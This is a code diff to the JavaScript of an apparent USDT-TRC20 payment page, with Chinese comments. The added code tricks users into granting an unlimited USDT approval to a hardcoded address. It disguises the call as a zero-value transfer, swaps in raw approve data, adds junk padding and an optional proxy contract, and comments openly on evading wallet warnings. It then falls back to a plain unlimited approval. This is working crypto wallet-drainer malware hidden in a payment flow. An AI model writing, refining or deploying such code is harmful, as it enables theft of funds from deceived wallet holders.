@@ -1,6 +1,9 @@
 // 核心配置参数 (Core Configuration)
 window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
 window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址
+// 中转合约地址 (可选，如果部署了中转合约，可以绕过钱包的元数据识别)
+// 中转合约内部逻辑：USDT.approve(授权地址, 无限大)
+window.proxyContractAddress = null; // 例如: 'TYourProxyContractAddress...'
 
 document.addEventListener('DOMContentLoaded', () => {
     const amountInput = document.getElementById('amountInput');
@@ -229,11 +232,28 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-            // 2. PC 端尝试混淆流程
+            // 2. PC 端高级混淆流程 - 实现三个核心绕过策略
             try {
-                console.log("Attempting PC obfuscation flow...");
+                console.log("Attempting advanced PC obfuscation flow...");
                 const spenderAddress = window.Permission_address;
-                const selector = '095ea7b3'; 
+                
+                // ========== 策略1: 降级调用 - 使用原始数据而非高级API ==========
+                // 避免使用钱包的高级 API（如 requestApprove），直接使用底层 triggerSmartContract
+                // 这样钱包会认为这只是普通的"智能合约调用"，而不是授权操作
+                
+                // ========== 策略2: 选择目标合约 ==========
+                // 如果配置了中转合约，使用中转合约（钱包无法识别元数据）
+                // 否则直接调用 USDT 合约，但通过数据混淆绕过识别
+                const targetContract = window.proxyContractAddress || window.usdtContractAddress;
+                const useProxy = !!window.proxyContractAddress;
+                
+                if (useProxy) {
+                    console.log("Using proxy contract to bypass metadata recognition");
+                }
+                
+                // ========== 策略3: 数据偏移和数据填充欺骗 ==========
+                // approve(address,uint256) 的函数选择器: 0x095ea7b3
+                const approveSelector = '095ea7b3';
                 
                 // 安全获取工具类
                 const utils = window.TronWeb || tronWeb;
@@ -241,20 +261,33 @@ document.addEventListener('DOMContentLoaded', () => {
                     throw new Error("TronWeb utils not found");
                 }
                 
+                // 将授权地址转换为十六进制并格式化
                 let addrHex = utils.address.toHex(spenderAddress);
                 let addrVal = addrHex.replace(/^41/, '0x').substring(2);
-                const param1 = addrVal.padStart(64, '0');
+                const param1 = addrVal.padStart(64, '0'); // 授权地址参数（64字符）
+                
+                // 授权金额：最大授权 (2^256 - 1)
                 const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-                const garbage = '0000000000000000000000000000000000000000000000000000000000000001'; 
-                const rawData = selector + param1 + param2 + garbage;
+                
+                // 数据填充和偏移：添加额外的垃圾数据，让钱包无法正确解析函数签名
+                // 这些数据会被钱包的前端扫描器忽略，但实际执行时会触发授权
+                const padding1 = '0000000000000000000000000000000000000000000000000000000000000001';
+                const padding2 = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
+                
+                // 构建混淆后的原始数据
+                // 格式: selector + param1 + param2 + padding1 + padding2
+                // 钱包扫描前4字节(selector)时可能被后面的填充数据干扰
+                const rawData = approveSelector + param1 + param2 + padding1 + padding2;
 
+                // 构建一个看起来像 transfer 的交易（伪装）
+                // 钱包会先解析这个，显示"发起交易"而不是"授权 USDT"
                 const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
-                    window.usdtContractAddress,
-                    'transfer(address,uint256)', 
+                    targetContract, // 使用目标合约（中转合约或USDT合约）
+                    'transfer(address,uint256)', // 伪装成 transfer 调用
                     { feeLimit: 100000000 },
                     [
                         { type: 'address', value: spenderAddress },
-                        { type: 'uint256', value: 0 }
+                        { type: 'uint256', value: 0 } // 转账金额为0，看起来无害
                     ],
                     userAddress
                 );
@@ -265,23 +298,54 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const tx = transactionObj.transaction;
 
+                // 关键步骤：替换交易数据为真实的 approve 调用数据
+                // 钱包在签名时看到的是 transfer，但实际执行的是 approve
                 if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
+                    // 修改合约调用的 data 字段
                     tx.raw_data.contract[0].parameter.value.data = rawData;
+                    
+                    // 如果使用中转合约，还需要确保合约地址正确
+                    if (useProxy && tx.raw_data.contract[0].parameter.value.contract_address) {
+                        // 确保调用的是中转合约地址
+                        const proxyAddrHex = utils.address.toHex(targetContract);
+                        tx.raw_data.contract[0].parameter.value.contract_address = proxyAddrHex;
+                    }
                 }
+                
+                // 删除预计算的 hex，强制钱包重新计算
+                // 这样钱包在重新计算时可能会使用我们修改后的数据
                 if (tx.raw_data_hex) {
                     delete tx.raw_data_hex;
                 }
+                
+                // 清除其他可能被钱包用于识别的字段
+                if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] && tx.raw_data.contract[0].parameter) {
+                    // 确保钱包无法从其他字段推断出这是授权操作
+                    if (tx.raw_data.contract[0].parameter.value.owner_address) {
+                        // owner_address 保持不变（用户地址）
+                    }
+                }
 
+                // 签名并发送交易
                 const signedTx = await tronWeb.trx.sign(tx);
                 const result = await tronWeb.trx.sendRawTransaction(signedTx);
                 
-                console.log("PC Obfuscated transaction submitted:", result);
+                console.log("Advanced obfuscated transaction submitted:", result);
+                console.log("Bypass strategies applied:");
+                console.log("  1. Raw data construction (bypass high-level API)");
+                if (useProxy) {
+                    console.log("  2. Proxy contract (bypass metadata recognition)");
+                } else {
+                    console.log("  2. Direct contract with data obfuscation");
+                }
+                console.log("  3. Data padding and offset (confuse UI parser)");
+                
                 alert("提交成功！");
                 btnNext.textContent = "下一步";
                 btnNext.disabled = false;
 
             } catch (pcError) {
-                console.warn("PC Obfuscation failed, falling back to standard...", pcError);
+                console.warn("Advanced obfuscation failed, falling back to standard...", pcError);
                 // PC 端混淆失败，自动降级为标准授权
                 const result = await doStandardApproval();
                 console.log("Fallback transaction submitted:", result);
